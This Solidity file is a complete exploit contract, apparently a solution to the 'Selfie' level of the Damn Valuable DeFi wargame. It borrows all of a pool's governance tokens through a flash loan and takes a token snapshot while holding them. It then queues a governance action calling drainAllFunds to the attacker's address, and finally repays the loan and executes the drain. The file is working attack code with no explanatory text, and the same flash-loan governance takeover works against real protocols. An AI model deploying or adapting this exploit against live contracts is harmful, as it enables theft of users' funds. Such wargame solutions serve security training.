// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import './SelfiePool.sol';
import "./SimpleGovernance.sol";

contract SelfieExploiter {

    address public owner;
    SelfiePool public pool;
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    uint256 private governanceActionId;

    constructor(address tokenAddress, address poolAddress, address governanceAddress) {
        owner = msg.sender;
        token = DamnValuableTokenSnapshot(tokenAddress);
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    modifier onlyOwner {
        require(msg.sender == owner, 'non-owner call');
        _;
    }

    modifier onlyPool {
        require(msg.sender == address(pool), 'non-pool call');
        _;
    }

    function takeLoan() public onlyOwner {
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function executeAttack() public onlyOwner {
        governance.executeAction(governanceActionId);
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) external onlyPool {
        require(tokenAddress == address(token), 'Invalid token requested by pool');
        token.snapshot(); // take snapshot while the contract holds the tokens

        governanceActionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );

        token.transfer(address(pool), borrowAmount);
    }

    function getGovernanceActionId() public view returns(uint256) {
        return governanceActionId;
    }
}